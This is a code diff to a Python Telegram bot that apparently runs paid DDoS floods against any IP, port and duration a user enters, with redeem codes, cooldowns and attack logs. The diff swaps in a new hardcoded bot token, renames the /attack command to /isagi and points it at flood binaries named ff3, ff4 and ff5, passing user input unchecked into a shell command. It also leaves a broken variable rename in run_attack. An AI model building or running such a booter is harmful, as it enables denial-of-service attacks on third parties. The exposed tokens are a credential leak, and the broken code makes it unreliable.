@@ -21,7 +21,7 @@ redeem_codes_collection = db['redeem_codes']
 attack_logs_collection = db['user_attack_logs']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7331564546:AAHaJPv02y2QyjNGTEHymMNygoRqYr9Ufvo'
+TELEGRAM_BOT_TOKEN = '8170163112:AAE0oOAOCQsr7x_D2dc30qeDXDRCGyILslI'
 ADMIN_USER_ID = 6353114118 
 ADMIN_USER_ID = 6353114118
 COOLDOWN_PERIOD = timedelta(minutes=1) 
@@ -293,7 +293,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*Here are the commands you can use:* \n\n"
             "*🔸 /start* - Start interacting with the bot.\n"
-            "*🔸 /attack* - Trigger an attack operation.\n"
+            "*🔸 /isagi* - Trigger an attack operation.\n"
             "*🔸 /redeem* - Redeem a code.\n"
         )
     else:
@@ -301,7 +301,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*💡 Available Commands for Admins:*\n\n"
             "*🔸 /start* - Start the bot.\n"
-            "*🔸 /attack* - Start the attack.\n"
+            "*🔸 /isagi* - Start the attack.\n"
             "*🔸 /add [user_id]* - Add a user.\n"
             "*🔸 /remove [user_id]* - Remove a user.\n"
             "*🔸 /thread [number]* - Set number of threads.\n"
@@ -335,7 +335,7 @@ async def start(update: Update, context: CallbackContext):
 
     message = (
         "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration>*\n"
+        "*Use /isagi <ip> <port> <duration>*\n"
         "*Let the war begin! ⚔️💥*"
         "*For more type /help to know more*\n"
     )
@@ -605,14 +605,14 @@ async def attack(update: Update, context: CallbackContext):
             remaining_time = COOLDOWN_PERIOD - elapsed_time
             await context.bot.send_message(
                 chat_id=chat_id, 
-                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.*", 
+                text=f"*⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /isagi again.*", 
                 parse_mode='Markdown'
             )
             return
 
     args = context.args
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /isagi <ip> <port> <duration>*", parse_mode='Markdown')
         return
 
     ip, port, duration = args
@@ -656,11 +656,11 @@ async def attack(update: Update, context: CallbackContext):
 
     # Determine the attack command based on the argument type
     if argument_type == 3:
-        attack_command = f"./Moin3 {ip} {port} {duration}"
+        isagi_command = f"./ff3 {ip} {port} {duration}"
     elif argument_type == 4:
-        attack_command = f"./Moin4 {ip} {port} {duration} {threads}"
+        isagi_command = f"./ff4 {ip} {port} {duration} {threads}"
     elif argument_type == 5:
-        attack_command = f"./Moin5 {ip} {port} {duration} {byte_size} {threads}"
+        isagi_command = f"./ff5 {ip} {port} {duration} {byte_size} {threads}"
 
     # Send attack details to the user
     await context.bot.send_message(chat_id=chat_id, text=( 
@@ -743,7 +743,7 @@ async def delete_attack_log(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No attack history found for this user to delete.*", parse_mode='Markdown')
 
 
-async def run_attack(chat_id, attack_command, context):
+async def run_attack(chat_id, isagi_command, context):
     try:
         process = await asyncio.create_subprocess_shell(
             attack_command,
@@ -1043,7 +1043,7 @@ def main():
     application.add_handler(CommandHandler("byte", set_byte))
     application.add_handler(CommandHandler("show", show_settings))
     application.add_handler(CommandHandler("users", list_users))
-    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("isagi", attack))
     application.add_handler(CommandHandler("gen", generate_redeem_code))
     application.add_handler(CommandHandler("redeem", redeem_code))
     application.add_handler(CommandHandler("help", help_command))
